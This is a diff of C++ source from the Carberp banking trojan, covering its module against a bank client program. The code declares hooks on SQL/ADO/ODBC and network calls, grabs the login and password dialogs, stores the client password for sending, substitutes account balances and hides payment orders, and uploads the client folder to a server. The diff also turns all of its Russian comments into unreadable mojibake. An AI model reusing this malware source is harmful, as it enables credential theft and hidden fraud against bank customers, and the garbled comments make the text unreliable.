@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "GetApi.h"
 #include "KeyLogSystems.h"
 #include "Memory.h"
@@ -31,46 +42,46 @@ namespace TINYCLIENT
 namespace Tiny
 {
 
-//какой остаток должен быть для указанного счета
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 struct RestAccount
 {
-	char account[32]; //если account[0] = 0, то конец массива
-	TIMESTAMP_STRUCT date; //после какой даты
-	__int64 sum; //какой остаток нужно подставить
-	__int64 debet; //сумма дебета (расхода) в указанный день
-	__int64 oldSum; //какой остаток был до подмены
-	__int64 oldDebet; //какой был дебет до подмены
+	char account[32]; //пїЅпїЅпїЅпїЅ account[0] = 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	TIMESTAMP_STRUCT date; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	__int64 sum; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	__int64 debet; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	__int64 oldSum; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	__int64 oldDebet; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-//скрываемые платежки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct HidePayment
 {
 	char account[32];
-	char num[32]; //номер документа
-	__int64 amount; //сумма
-	TIMESTAMP_STRUCT date; //дата платежки
-	int orgDate, dayDate, payDate; //даты до скрытия
+	char num[32]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	__int64 amount; //пїЅпїЅпїЅпїЅпїЅ
+	TIMESTAMP_STRUCT date; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int orgDate, dayDate, payDate; //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-static RestAccount restAccounts[10]; //подмена баланса
-static HidePayment hidePayments[10]; //скрываемые платежки
-static bool runHideReplacement = false; //true - если надо провести подмену скрытие
-static bool replacementDone = false; //true если подмена была совершена
+static RestAccount restAccounts[10]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static HidePayment hidePayments[10]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static bool runHideReplacement = false; //true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static bool replacementDone = false; //true пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 const DWORD PROCESS_HASH = 0x9530DB12; // tiny.exe
-const DWORD PROCESS_HASH2 = 0x97BB99CB; // cb193w.exe (старая версия клиента)
+const DWORD PROCESS_HASH2 = 0x97BB99CB; // cb193w.exe (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 
-const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
-const DWORD HashTPasswordDlg = 0xDF7C7D28; //класс окна ввода пароля
-const DWORD HashTKeyPasswordDlg = 0x8129DC7A; //класс окна ввода пароля к ключу (для старой версии клиента)
+const DWORD HashTfAuthNew = 0x19DEB558; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+const DWORD HashTPasswordDlg = 0xDF7C7D28; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+const DWORD HashTKeyPasswordDlg = 0x8129DC7A; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 
 char folderTiny[MAX_PATH];
 
-//контролы с которых нужно забрать текст в форме регистрации
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD GrabControls[] = { 0x79770896 /* TComboBox */, 0x48B934F1 /* TEdit */, 0 };
 const int MaxFindedControl = 3;
-static char pathMDB[MAX_PATH]; //путь к базе данных
-static DWORD HashCurrProcess = 0; //хеш какого из клиентов
+static char pathMDB[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+static DWORD HashCurrProcess = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 struct ForFindControl
 {
@@ -81,43 +92,43 @@ struct ForFindControl
 };
 
 /////////////////////////////////////////////////////////////////////////////////////////
-//состояние (режим работы) системы перехвата SQL запросов
-//1 - чтение баланса счетов (чтение счета), 2 - нужный счет прочитан, чтение баланса
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SQL пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//1 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ), 2 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int stateSQL = 0; 
-static char passwordClient[100]; //пароль к клиенту (для отправки через аз)
-static char bankClient[100]; //имя банка клиента
-static int codeBankClient; //код банка
+static char passwordClient[100]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ)
+static char bankClient[100]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static int codeBankClient; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-//информация об аккаунте
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct InfoAccount
 {
-	WCHAR account[16]; //счет клиента
-	__int64 balance; //остаток на счету, тип Currency, последние 4-е знака идут после точки (копейки)
-	__int64 oldBalance; //предыдущее значение баланса
-	WCHAR name[128]; //название клиента
+	WCHAR account[16]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	__int64 balance; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ Currency, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 4-пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
+	__int64 oldBalance; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	WCHAR name[128]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-static InfoAccount accountClient[10]; //текущие остатки на счетах
-static int currAccount = 0; //текущий счет из accountClient
+static InfoAccount accountClient[10]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+static int currAccount = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ accountClient
 
 ///////////////////////////////////////////////////////////////////////////////////////////
-//тип функции вызываемой при срабатывании фильтра
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 typedef int (*type_SQLFunc)( WCHAR* sql, int len );
 
-//фильтр по которому вызываем функцию для анализа и изменения sql запроса
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ sql пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct FilterSQLFunc
 {
-	WCHAR* and; //перечень слов в нижнем регистре разделенных нулями которые должны подряд встретится в запросе, в конце должно быть 2 нуля
-	WCHAR* not; //перечень слов в нижнем регистре разделенных нулями которых не должно быть в запросе, в конце должно быть 2 нуля
+	WCHAR* and; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅпїЅ
+	WCHAR* not; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅпїЅ
 	type_SQLFunc func;
 };
 
-//запрос счетов, стартует передачу баланса
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int FSF_SelectAmounts( WCHAR* sql, int len ); 
-//запрос счетов в старом клиенте, смотрим балансы и отсылаем в админку
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int FSF_SelectAmountsOld( WCHAR* sql, int len ); 
-//после синхронизация обновляется конфиг для установки даты синхронизации, в этот
-//момент нужно запустить подмену
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int FSF_UpdateConfigLastSync( WCHAR* sql, int len );
 
 FilterSQLFunc filtersSQL[] = 
@@ -129,18 +140,18 @@ FilterSQLFunc filtersSQL[] =
 };
 
 ////////////////////////////////////////////////////////////////////////////////////////////
-//тип функции вызываемой при чтении значения определенного поля
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 typedef void (*type_FieldValueFunc)( VARIANT* v );
 
 struct FieldValue
 {
-	DWORD hash; //хеш имени поля
+	DWORD hash; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	type_FieldValueFunc func;
 };
 
-static void FV_Code_Amounts( VARIANT* v ); //чтение поля Code таблицы Amounts
-static void FV_Confirmed_Amounts( VARIANT* v ); //чтение поля Confirmed таблицы Amounts
-static void FV_FullName_Amounts( VARIANT* v ); //чтение поля FullName таблицы Amounts
+static void FV_Code_Amounts( VARIANT* v ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Code пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Amounts
+static void FV_Confirmed_Amounts( VARIANT* v ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Confirmed пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Amounts
+static void FV_FullName_Amounts( VARIANT* v ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ FullName пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Amounts
 
 FieldValue filedsValue[] =
 {
@@ -151,33 +162,33 @@ FieldValue filedsValue[] =
 };
 
 //////////////////////////////////////////////////////////////////////////////////////////
-//Доступ к базе данных идет через технологию ADO
-//Интерфейс соединения с базой данных
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ADO
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 GUID IID_Connection = { 0x00000514, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
-//Интерфейс работы с таблицами
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 GUID IID_Recordset  = { 0x00000535, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
-//Интерфейс выполнения команд в ADO
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ ADO
 GUID IID_Command =	  { 0x00000507, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
 
 GUID IID_Fields = { 0x0000154d, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
 
 typedef HRESULT (__stdcall *type_QueryInterface)( void* This, REFIID riid, void **ppv );
-//тип функции запроса интерфейса чтения значения полей
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 typedef HRESULT (__stdcall *type_get_Fields)( void* This, void** ppv );
-//Возврат поля из списка полей
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 typedef HRESULT (__stdcall *type_get_Item)( void* This, VARIANT Index, void** ppv );
-//возврат имени поля
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 typedef HRESULT (__stdcall *type_get_Name)( void* This, BSTR * pbstr );
-//возврат типа поля
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 typedef HRESULT (__stdcall *type_get_Type)( void* This, enum DataTypeEnum * pDataType );
-//возврат значения поля
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 typedef HRESULT (__stdcall *type_get_Value)( void* This, VARIANT * pvar );
 
 static BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
 static BOOL (WINAPI *RealConnect)( SOCKET s, const struct sockaddr *name, int namelen );
 static BOOL (WINAPI *RealHttpSendRequestA)( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
 static HRESULT (STDAPICALLTYPE *RealCoCreateInstance)( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv );
-//для ODBC с которым старый клиент работает
+//пїЅпїЅпїЅ ODBC пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static SQLRETURN (WINAPI *RealSQLDriverConnectA)(
      SQLHDBC         ConnectionHandle,
      SQLHWND         WindowHandle,
@@ -191,24 +202,24 @@ SQLRETURN (WINAPI *RealSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* Statemen
 SQLRETURN (WINAPI *RealSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
 SQLRETURN (WINAPI *RealSQLExecute)( SQLHSTMT StatementHandle );
 
-//перехват вызова функций в интерфейсах ADO
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ADO
 static HRESULT (__stdcall *RealConnection_Open)( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options );
 static HRESULT (__stdcall *RealRecordset_Open)( void* This, VARIANT Source, VARIANT ActiveConnection, enum CursorTypeEnum CursorType, enum LockTypeEnum LockType, long Options );
 static HRESULT (__stdcall *RealCommand_put_CommandText)( void* This, BSTR pbstr );
 static type_get_Value RealField_get_Value;
 
-static bool SetHooks(); //установка хуков в момент активизации системы
-static bool SetHooks2(); //установка хуков в момент запуска приложения
+static bool SetHooks(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static bool SetHooks2(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static bool InitData();
 static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count );
-//поток подмены баланса и скрытия платежек
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI ThreadHideReplacement(void*);
-//восстановить баланс и скрываемую платежку
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void RestoreBalansAndDocs();
-//конвертация счета из базы данных в нормальный вид
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 static char* AccountToNormal( const char* from, char* to );
-//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
-//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ len пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ)
 static __int64 SumToInt( const char* s, int* len );
 
 static void CloseDB( ODBC* DB )
@@ -236,18 +247,18 @@ static ODBC* OpenDB()
 }
 
 
-//отсылка полного клиента на видео сервер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI SendTiny(LPVOID)
 {
 	BOT::Initialize(ProcessUnknown);
-	DBG( "Tiny", "запуск отсылки программы на сервер из папки %s", folderTiny );
+	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", folderTiny );
 //	DWORD folderSize = 0;
 //	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
 //	{
-//		DBG( "Tiny", "Папка программы больше заданного размера, не копируем" );
+//		DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 //		return 0;
 //	}
-//	DBG( "Tiny", "Размер папки %d байт", folderSize );
+//	DBG( "Tiny", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %d пїЅпїЅпїЅпїЅ", folderSize );
 	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
 	m_memcpy( clientPrg, "tiny_client\\", 12 );
 	PathToName( folderTiny, clientPrg + 12, sizeof(clientPrg) - 12 );
@@ -257,17 +268,17 @@ DWORD WINAPI SendTiny(LPVOID)
 	STR::Free(cryptName);
 	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
 	{
-		DBG( "Tiny", "Эта папка на данный момент выкачивается" );
+		DBG( "Tiny", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
-	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
